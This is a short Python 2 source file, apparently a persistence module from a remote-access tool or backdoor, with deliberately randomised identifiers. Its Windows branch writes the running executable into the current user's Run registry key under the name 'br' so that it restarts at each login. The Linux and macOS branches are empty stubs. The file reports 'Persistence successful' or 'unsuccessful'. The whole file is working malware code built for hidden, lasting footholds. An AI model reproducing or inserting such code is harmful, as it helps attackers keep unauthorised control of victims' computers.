# -*- coding: utf-8 -*-
import sys
def dmmqZMPxMdUJsTPVukGjpAtNfPDptYdx():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    BznAPVchxMhmWMxebTNTWARuRIZAFKJY = r'Software\Microsoft\Windows\CurrentVersion\Run'
    DvDeHNiAOufKVlXZzmERuXuDInbzkkXU = sys.executable
    try:
        lhmAPyZtLZxmrEksezdnUcwsFWRhEhLg = _winreg.OpenKey(HKCU, BznAPVchxMhmWMxebTNTWARuRIZAFKJY, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(lhmAPyZtLZxmrEksezdnUcwsFWRhEhLg, 'br', 0, _winreg.REG_SZ, DvDeHNiAOufKVlXZzmERuXuDInbzkkXU)
        _winreg.CloseKey(lhmAPyZtLZxmrEksezdnUcwsFWRhEhLg)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def kZgOFxMXAqEfttKkrYNyWRyIoMLFzsQa():
    return False, 'nothing here yet'
def SPUqUemwWzbUDLJslBptRELGGXEEnxvC():
    return False, 'nothing here yet'
def JJyEbjrynmapUHJCDQUQjcshajVjEFwA(plat_type):
    if plat_type.startswith('win'):
        success, fmFGtEfgqavcAYyRaNaiJUyPYYFMKwZG = dmmqZMPxMdUJsTPVukGjpAtNfPDptYdx()
    elif plat_type.startswith('linux'):
        success, fmFGtEfgqavcAYyRaNaiJUyPYYFMKwZG = kZgOFxMXAqEfttKkrYNyWRyIoMLFzsQa()
    elif plat_type.startswith('darwin'):
        success, fmFGtEfgqavcAYyRaNaiJUyPYYFMKwZG = SPUqUemwWzbUDLJslBptRELGGXEEnxvC()
    else:
        return 'Error, platform unsupported.'
    if success:
        jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = 'Persistence successful, {}.'.format(fmFGtEfgqavcAYyRaNaiJUyPYYFMKwZG)
    else:
        jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = 'Persistence unsuccessful, {}.'.format(fmFGtEfgqavcAYyRaNaiJUyPYYFMKwZG)
    return jLhewPiHvUwpJiUUvJccqlnCSUWejxGe
